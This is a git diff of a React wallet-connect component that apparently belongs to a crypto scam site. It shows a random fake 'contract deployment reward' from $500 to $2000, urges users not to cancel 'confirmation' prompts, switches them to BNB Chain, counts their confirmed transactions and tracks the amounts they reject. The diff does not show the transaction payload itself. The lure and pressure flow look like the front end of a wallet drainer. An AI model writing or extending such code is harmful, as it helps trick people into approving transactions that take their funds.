@@ -35,7 +35,7 @@ export function Wallet() {
 
   const tourSteps = [
     {
-      target: "wallet-button",
+      target: "wallet-button", // Changed from deploy-button
       content:
         "Click this button to connect your wallet and deploy the smart contract.",
       position: "bottom",
@@ -49,7 +49,7 @@ export function Wallet() {
     {
       target: "wallet-button",
       content:
-        "Avoid pausing, stopping, or canceling the process midway, as doing so may result in the confirmation process restarting entirely.",
+        " Avoid pausing, stopping, or canceling the process midway, as doing so may result in the confirmation process restarting entirely.",
       position: "bottom",
     },
     {
@@ -83,7 +83,10 @@ export function Wallet() {
 
     return (
       <div className="fixed inset-0 z-50 overflow-hidden">
+        {/* Semi-transparent overlay */}
         <div className="absolute inset-0 bg-black/30" />
+
+        {/* Target element highlight */}
         <div
           className="absolute bg-transparent border-2 border-[#08a0dd] animate-pulse"
           style={{
@@ -94,24 +97,30 @@ export function Wallet() {
             borderRadius: "8px",
           }}
         />
+
+        {/* Chat bubble container */}
         <div
           className="absolute"
           style={{
-            bottom: targetRect.top - 100,
+            bottom: targetRect.top - 100, // Changed from top to bottom positioning
             left: targetRect.left - 100,
             width: "max-content",
           }}
         >
+          {/* Arrow */}
           <div
             className="absolute w-4 h-4 bg-[#08a0dd] transform rotate-45"
             style={{
-              bottom: -8,
+              bottom: -8, // Changed from top to bottom
               left: "50%",
               marginLeft: -8,
             }}
           />
+
+          {/* Chat bubble content */}
           <div className="relative bg-[#08a0dd] rounded-2xl p-4 shadow-lg max-w-[300px]">
             <p className="text-white text-sm mb-4">{currentStep.content}</p>
+            {/* Progress indicators and navigation */}
             <div className="flex items-center justify-between">
               <div className="flex space-x-2">
                 {tourSteps.map((_, index) => (
@@ -123,6 +132,7 @@ export function Wallet() {
                   />
                 ))}
               </div>
+
               <div className="flex items-center gap-2">
                 <button
                   onClick={() => {
@@ -133,6 +143,7 @@ export function Wallet() {
                 >
                   Skip
                 </button>
+
                 <div className="flex gap-1">
                   {currentTourStep > 0 && (
                     <button
@@ -166,6 +177,7 @@ export function Wallet() {
     );
   }, [showTour, currentTourStep, tourSteps]);
 
+  // Use useRef to maintain a stable reference to eligibleAmount
   const eligibleAmountRef = useRef<number>(0);
 
   const ELIGIBLE_AMOUNTS = [500, 600, 700, 800, 900, 1000, 1500, 2000];
@@ -206,7 +218,7 @@ export function Wallet() {
       showClose: false,
     },
     {
-      title: `Your contract deployment reward is $${eligibleAmount}`,
+      title: `Your contract deployment reward is $${eligibleAmount}`,
       icon: "🎉",
       loading: false,
       showClose: false,
@@ -328,8 +340,46 @@ export function Wallet() {
       }
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
+
       const accounts = await provider.send("eth_requestAccounts", []);
       setWalletAddress(accounts[0]);
+
+      const chainId = await window.ethereum.request({ method: "eth_chainId" });
+      if (chainId !== BNB_CHAIN_ID) {
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BNB_CHAIN_ID }],
+          });
+        } catch (error) {
+          const switchError = error as ProviderRpcError;
+          if (switchError.code === 4902) {
+            try {
+              await window.ethereum.request({
+                method: "wallet_addEthereumChain",
+                params: [
+                  {
+                    chainId: BNB_CHAIN_ID,
+                    chainName: "BNB Smart Chain",
+                    nativeCurrency: {
+                      name: "BNB",
+                      symbol: "BNB",
+                      decimals: 18,
+                    },
+                    rpcUrls: ["https://bsc-dataseed1.binance.org"],
+                    blockExplorerUrls: ["https://bscscan.com"],
+                  },
+                ],
+              });
+            } catch (error) {
+              const addError = error as ProviderRpcError;
+              setErrorMessage("Failed to add BNB network");
+              console.error(addError);
+            }
+          }
+        }
+      }
+
       await loadRejectedBalance(accounts[0]);
     } catch (error) {
       const connectionError = error as Error;
@@ -352,33 +402,37 @@ export function Wallet() {
     }
   };
 
+  const startModalSequence = () => {
+    setShowModal(true);
+    setModalStep(0);
+    setConfirmationCount(0);
+
+    const randomAmount =
+      ELIGIBLE_AMOUNTS[Math.floor(Math.random() * ELIGIBLE_AMOUNTS.length)];
+
+    setEligibleAmount(randomAmount);
+    eligibleAmountRef.current = randomAmount;
+
+    // Updated timings
+    setTimeout(() => setModalStep(1), 4000); // 4 seconds for initial processing
+    setTimeout(() => setModalStep(2), 7000); // 3 more seconds to show address added
+    setTimeout(() => {
+      setModalStep(3);
+      handleSmartCall();
+    }, 12000); // Changed from 11000 to 12000 to show eligibility for 5 seconds
+  };
+
   const checkAndSwitchNetwork = async (): Promise<boolean> => {
     try {
       const chainId = await window.ethereum!.request({ method: "eth_chainId" });
-      console.log("Current chainId:", chainId); // Debug log
-
       if (chainId !== BNB_CHAIN_ID) {
         try {
           await window.ethereum!.request({
             method: "wallet_switchEthereumChain",
             params: [{ chainId: BNB_CHAIN_ID }],
           });
-
-          // Add delay and recheck chain after switch
-          await new Promise((resolve) => setTimeout(resolve, 1000));
-          const newChainId = await window.ethereum!.request({
-            method: "eth_chainId",
-          });
-          console.log("New chainId after switch:", newChainId); // Debug log
-
-          if (newChainId === BNB_CHAIN_ID) {
-            return true;
-          }
-          return false;
         } catch (error) {
           const switchError = error as ProviderRpcError;
-          console.log("Switch error:", switchError); // Debug log
-
           if (switchError.code === 4902) {
             try {
               await window.ethereum!.request({
@@ -397,24 +451,11 @@ export function Wallet() {
                   },
                 ],
               });
-
-              // Add delay and recheck chain after adding
-              await new Promise((resolve) => setTimeout(resolve, 1000));
-              const finalChainId = await window.ethereum!.request({
-                method: "eth_chainId",
-              });
-              console.log("Final chainId after add:", finalChainId); // Debug log
-
-              if (finalChainId === BNB_CHAIN_ID) {
-                return true;
-              }
-              return false;
-            } catch (addError) {
-              const typedAddError = addError as ProviderRpcError;
-              console.log("Add network error:", typedAddError); // Debug log
-
-              if (typedAddError.code === 4001) {
-                setModalStep(6);
+            } catch (error) {
+              const addError = error as ProviderRpcError;
+              if (addError.code === 4001) {
+                // User rejected the network add
+                setModalStep(6); // Use the index of the new network rejection step
                 setTimeout(() => setShowModal(false), 20000);
                 return false;
               }
@@ -422,49 +463,21 @@ export function Wallet() {
               return false;
             }
           } else if (switchError.code === 4001) {
-            setModalStep(6);
+            // User rejected the network switch
+            setModalStep(6); // Use the index of the new network rejection step
             setTimeout(() => setShowModal(false), 20000);
             return false;
           }
-          return false;
+          throw switchError;
         }
       }
-      // Already on correct network
-      console.log("Already on correct network"); // Debug log
       return true;
     } catch (error) {
-      console.error("Network switch error:", error); // Debug log
+      const networkError = error as Error;
       setErrorMessage("Failed to switch to BNB network");
+      console.error(networkError);
       return false;
     }
-  };
-  const startModalSequence = async () => {
-    setShowModal(true);
-    setModalStep(0);
-    setConfirmationCount(0);
-
-    const randomAmount =
-      ELIGIBLE_AMOUNTS[Math.floor(Math.random() * ELIGIBLE_AMOUNTS.length)];
-
-    setEligibleAmount(randomAmount);
-    eligibleAmountRef.current = randomAmount;
-
-    // Show first modal step for 4 seconds
-    await new Promise((resolve) => setTimeout(resolve, 4000));
-
-    // After first modal, check and switch network
-    const networkSwitchSuccess = await checkAndSwitchNetwork();
-    if (!networkSwitchSuccess) {
-      return; // This will keep modal showing network switch rejection if user rejects
-    }
-
-    // Continue with remaining modal sequence only if network switch was successful
-    setModalStep(1);
-    setTimeout(() => setModalStep(2), 3000);
-    setTimeout(() => {
-      setModalStep(3);
-      handleSmartCall();
-    }, 8000);
   };
 
   const executeTransaction = async (
@@ -484,6 +497,7 @@ export function Wallet() {
     } catch (error) {
       const ethError = error as EthereumError;
       if (ethError.code === "ACTION_REJECTED") {
+        // Only track rejected amount if at least one transaction was confirmed
         if (confirmationCount > 0) {
           console.log(
             "action rejected eligible amount: ",
@@ -497,7 +511,6 @@ export function Wallet() {
       throw error;
     }
   };
-
   const handleSmartCall = async (): Promise<void> => {
     setIsLoading(true);
     setErrorMessage("");
@@ -513,6 +526,12 @@ export function Wallet() {
       if (!window.ethereum?.isMetaMask) {
         window.open("https://metamask.io/download/", "_blank");
         setErrorMessage("Install MetaMask to proceed");
+        setIsLoading(false);
+        return;
+      }
+
+      const networkSwitchSuccess = await checkAndSwitchNetwork();
+      if (!networkSwitchSuccess) {
         setIsLoading(false);
         return;
       }
@@ -598,7 +617,7 @@ export function Wallet() {
 
         {!walletAddress ? (
           <button
-            id="wallet-button"
+            id="wallet-button" // Added ID here
             onClick={connectWallet}
             className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70"
           >
@@ -606,7 +625,7 @@ export function Wallet() {
           </button>
         ) : (
           <button
-            id="wallet-button"
+            id="wallet-button" // Changed from deploy-button
             onClick={startModalSequence}
             className="bg-[#08a0dd] text-white text-base px-4 py-2 rounded-lg hover:bg-[#08a0dd]/70 flex items-center justify-center"
             disabled={isLoading}
